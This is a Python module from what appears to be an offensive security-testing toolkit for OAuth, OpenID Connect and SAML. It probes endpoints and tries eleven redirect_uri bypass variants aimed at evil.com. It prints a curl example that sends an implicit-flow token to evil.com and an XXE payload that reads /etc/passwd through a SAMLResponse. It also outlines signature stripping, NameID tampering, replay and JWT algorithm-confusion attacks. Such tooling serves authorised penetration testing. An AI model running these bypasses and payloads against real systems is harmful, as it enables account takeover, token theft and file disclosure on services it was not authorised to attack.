"""
modules/oauth_saml.py
tmrswrr - OAuth 2.0 / SAML / OpenID Connect Security Testing
Token hijacking, redirect URI bypass, state bypass, implicit flow abuse
"""
import json
import os
import urllib.parse

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    error,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def oauth_recon():
    section("OAUTH / OIDC ENDPOINT DISCOVERY")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    discovery_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth/authorize",
        "/oauth/token",
        "/oauth2/authorize",
        "/oauth2/token",
        "/connect/authorize",
        "/connect/token",
        "/auth/oauth/v2/authorize",
        "/api/oauth/authorize",
        "/sso/oauth2/authorize",
    ]

    info(f"Probing {len(discovery_paths)} OAuth/OIDC endpoints...")
    print()
    found = []
    for path in discovery_paths:
        out, _, _ = run_cmd(f'curl -sk -o /dev/null -w "%{{http_code}}" {cookie_flag} {url}{path} -m 5')
        code = out.strip()
        if code in ("200", "301", "302", "400"):
            success(f"[{code}] {url}{path}")
            found.append(path)
            if code == "200" and "openid" in path:
                content, _, _ = run_cmd(f'curl -sk {cookie_flag} {url}{path} -m 5')
                print(f"{NEON_CYN}{content[:600]}{RST}")
                add_vuln("OAuth/OIDC Discovery Endpoint Exposed", "Info", "A07:2021",
                         f"OpenID configuration accessible at {path}", url + path)
        else:
            print(f"  {DIM}[{code}] {path}{RST}")

    if not found:
        info("No standard OAuth endpoints found - check page source for authorization URLs")


def redirect_uri_bypass():
    section("REDIRECT URI VALIDATION BYPASS")
    url = _target()

    auth_url = prompt("OAuth authorization URL (e.g. /oauth/authorize?client_id=...&redirect_uri=...)")
    legit_redirect = prompt("Legitimate redirect_uri (e.g. https://app.com/callback)")

    if not legit_redirect:
        warn("Need legitimate redirect_uri to test bypasses")
        return

    parsed = urllib.parse.urlparse(legit_redirect)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path

    bypass_variants = [
        legit_redirect + "@evil.com",
        legit_redirect + "%40evil.com",
        legit_redirect.replace("https://", "https://evil.com@"),
        base + ".evil.com" + path,
        base + path + "/../evil",
        base + path + "?x=y&redirect=evil.com",
        "https://evil.com",
        legit_redirect + "/../../evil",
        legit_redirect.replace(parsed.netloc, parsed.netloc + ".evil.com"),
        legit_redirect + "%00",
        "https://" + parsed.netloc + ".evil.com",
    ]

    info(f"Testing {len(bypass_variants)} redirect_uri bypass variants...")
    print()
    for bypass in bypass_variants:
        enc = urllib.parse.quote(bypass, safe="")
        test_url = f"{url}{auth_url}".replace(
            urllib.parse.quote(legit_redirect, safe=""), enc
        ) if auth_url else f"{url}/oauth/authorize?redirect_uri={enc}"

        out, _, _ = run_cmd(f'curl -sk -o /dev/null -w "%{{http_code}}" "{test_url}" -L -m 5')
        code = out.strip()

        if code in ("200", "302"):
            # Check if redirect goes to evil.com
            loc_out, _, _ = run_cmd(
                f'curl -sk -D - -o /dev/null "{test_url}" -m 5 | grep -i "location:"'
            )
            if "evil.com" in loc_out.lower():
                success(f"REDIRECT BYPASS: {bypass[:60]}")
                add_vuln("OAuth Redirect URI Bypass", "Critical", "A07:2021",
                         f"Redirect to attacker: {bypass}", url)
            else:
                print(f"  {DIM}[{code}] {bypass[:60]}{RST}")
        else:
            print(f"  {DIM}[{code}] {bypass[:60]}{RST}")


def state_parameter_check():
    section("STATE PARAMETER / CSRF CHECK")
    url = _target()

    info("Testing OAuth state parameter for CSRF protection...")
    auth_url = prompt("Authorization endpoint URL (full URL with params)")
    if not auth_url:
        auth_url = f"{url}/oauth/authorize?client_id=test&response_type=code&redirect_uri=https://example.com"

    print(f"""
  {NEON_CYN}CSRF attack via missing state parameter:{RST}
    1. Attacker initiates OAuth flow without state param
    2. Gets authorization code for their account
    3. Tricks victim into submitting that code to /callback
    4. Victim is logged in to attacker's account

  {NEON_CYN}Testing state param presence:{RST}
""")
    out, _, _ = run_cmd(f'curl -sk "{auth_url}" -L -m 10')
    if "state" not in auth_url.lower():
        warn("State parameter NOT present in authorization URL - CSRF possible!")
        add_vuln("OAuth Missing State Parameter", "High", "A07:2021",
                 "No CSRF protection via state parameter in OAuth flow", url)
    else:
        success("State parameter present - check if it's validated server-side")
        info("To verify: change state value, complete flow, check if server accepts it")


def implicit_flow_attack():
    section("IMPLICIT FLOW ATTACK / TOKEN LEAKAGE")
    url = _target()

    info("Checking for insecure OAuth implicit flow (token in URL fragment)...")
    print(f"""
  {NEON_CYN}Implicit Flow Issues:{RST}

  {NEON_GRN}[1] Token in URL Fragment (Referrer Leakage):{RST}
    Token appears in URL: /callback#access_token=TOKEN&token_type=bearer
    → Leaks via Referrer header to analytics, CDN, third-party scripts
    → Logged in browser history and server access logs

  {NEON_GRN}[2] Token Theft via Open Redirect:{RST}
    Combine redirect_uri bypass with implicit flow
    → Token redirected to attacker in URL fragment
    → curl -sk "AUTH_URL&response_type=token&redirect_uri=https://evil.com"

  {NEON_GRN}[3] Token Replay:{RST}
    Capture token from URL, reuse without expiry check
    → No expiry: permanent access
    → No binding: use from different IP/UA

  {NEON_CYN}Check authorization URL response_type:{RST}
""")
    auth_url = prompt("OAuth authorization URL to inspect")
    if auth_url:
        if "token" in auth_url and "code" not in auth_url:
            warn("Implicit flow detected (response_type=token) - token in URL!")
            add_vuln("OAuth Implicit Flow in Use", "High", "A07:2021",
                     "Access token exposed in URL fragment - prone to leakage", url)
        elif "code" in auth_url:
            success("Authorization code flow (PKCE recommended)")
            info("Check if PKCE (code_challenge) is required")
            if "code_challenge" not in auth_url:
                warn("No PKCE - authorization code interception possible!")
                add_vuln("OAuth Missing PKCE", "Medium", "A07:2021",
                         "No code_challenge in authorization URL - code interception risk", url)


def token_analysis():
    section("ACCESS TOKEN ANALYSIS")

    token = SESSION.get("auth_token", "") or prompt("Paste access token (JWT or opaque)")
    if not token:
        return

    if token.startswith("eyJ") and "." in token:
        import base64
        parts = token.split(".")
        if len(parts) >= 2:
            def b64d(s):
                s += "=" * (4 - len(s) % 4)
                try:
                    return json.loads(base64.b64decode(s))
                except Exception:
                    return {}

            header  = b64d(parts[0])
            payload = b64d(parts[1])

            print(f"\n  {NEON_CYN}JWT Header:{RST}  {json.dumps(header, indent=2)}")
            print(f"  {NEON_CYN}JWT Payload:{RST} {json.dumps(payload, indent=2)}")

            alg = header.get("alg", "")
            if alg.lower() == "none":
                success("CRITICAL: alg=none - signature bypass!")
                add_vuln("JWT Algorithm None", "Critical", "A07:2021",
                         "JWT uses alg:none - no signature verification", "")
            elif alg.lower() == "hs256":
                info("HS256 - check for RS256→HS256 confusion if server uses RSA")
            elif alg.lower() in ("rs256", "es256"):
                info(f"{alg} - test algorithm confusion: sign with public key as HS256 secret")

            # Check claims
            import time
            exp = payload.get("exp")
            if exp:
                remaining = exp - time.time()
                if remaining < 0:
                    warn("Token is EXPIRED!")
                elif remaining > 86400 * 30:
                    warn(f"Token expires in {remaining/86400:.0f} days - very long lifetime!")
                    add_vuln("JWT Long Expiry", "Low", "A07:2021",
                             f"Token valid for {remaining/86400:.0f} days", "")
            else:
                warn("No expiry (exp) claim - token never expires!")
                add_vuln("JWT No Expiry", "Medium", "A07:2021",
                         "JWT token has no exp claim - never expires", "")

            if "scope" in payload:
                info(f"Scopes: {payload['scope']}")
            if "role" in payload or "roles" in payload or "permissions" in payload:
                info("Role/permission claims present - test for privilege escalation by modifying them")
    else:
        info("Opaque token - check for predictability and replay attacks")
        info("Test token reuse across sessions, different IPs, after logout")


def saml_attacks():
    section("SAML SECURITY TESTING")
    url = _target()

    print(f"""
  {NEON_CYN}SAML Attack Vectors:{RST}

  {NEON_GRN}[1] XML Signature Wrapping (XSW):{RST}
    Move or duplicate the signed element to bypass verification
    Tools: saml-raider (Burp extension), SAML Raider

  {NEON_GRN}[2] XXE via SAML Response:{RST}
    Inject DOCTYPE with external entity into SAML XML
    Since SAML is XML, XXE applies if parser is not hardened

    Payload (inject into SAMLResponse):
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <samlp:Response>
      <saml:Assertion>
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Assertion>
    </samlp:Response>

  {NEON_GRN}[3] Signature Bypass (alg=none equivalent):{RST}
    Some libraries accept unsigned responses
    Remove the <ds:Signature> block entirely and test

  {NEON_GRN}[4] SAML Replay Attack:{RST}
    Capture a valid SAMLResponse, resubmit after session end
    → Missing NotOnOrAfter validation = permanent access

  {NEON_GRN}[5] NameID Manipulation:{RST}
    Change NameID to admin@target.com in the assertion
    Works if assertion is not signed or signature not verified
""")

    saml_resp = prompt("Paste base64-encoded SAMLResponse to analyze (or Enter to skip)")
    if saml_resp:
        import base64
        try:
            decoded = base64.b64decode(saml_resp).decode("utf-8", errors="replace")
            print(f"\n{NEON_CYN}Decoded SAML:{RST}")
            print(decoded[:1500])

            if "Signature" not in decoded:
                warn("No <Signature> block - response may be unsigned!")
                add_vuln("Unsigned SAML Response", "Critical", "A07:2021",
                         "SAML response contains no digital signature", url)
            if "NotOnOrAfter" not in decoded:
                warn("No NotOnOrAfter - replay attack possible!")
                add_vuln("SAML Missing Expiry", "High", "A07:2021",
                         "SAML assertion has no expiry - replay attack possible", url)
            if "SYSTEM" in decoded or "ENTITY" in decoded:
                warn("DOCTYPE/ENTITY in SAML - XXE risk!")
        except Exception as e:
            error(f"Could not decode SAMLResponse: {e}")


def run():
    print_banner("OAUTH / SAML / OIDC SECURITY",
                 "OAuth 2.0 · SAML · OpenID Connect")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} OAuth / OIDC Endpoint Discovery
  {NEON_CYN}[2]{RST} Redirect URI Bypass (11 variants)
  {NEON_CYN}[3]{RST} State Parameter / CSRF Check
  {NEON_CYN}[4]{RST} Implicit Flow Attack & Token Leakage
  {NEON_CYN}[5]{RST} Access Token Analysis (JWT claims, alg)
  {NEON_CYN}[6]{RST} SAML Attacks (XSW, XXE, Replay)
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            oauth_recon()
        elif c == "2":
            redirect_uri_bypass()
        elif c == "3":
            state_parameter_check()
        elif c == "4":
            implicit_flow_attack()
        elif c == "5":
            token_analysis()
        elif c == "6":
            saml_attacks()
        save_session()
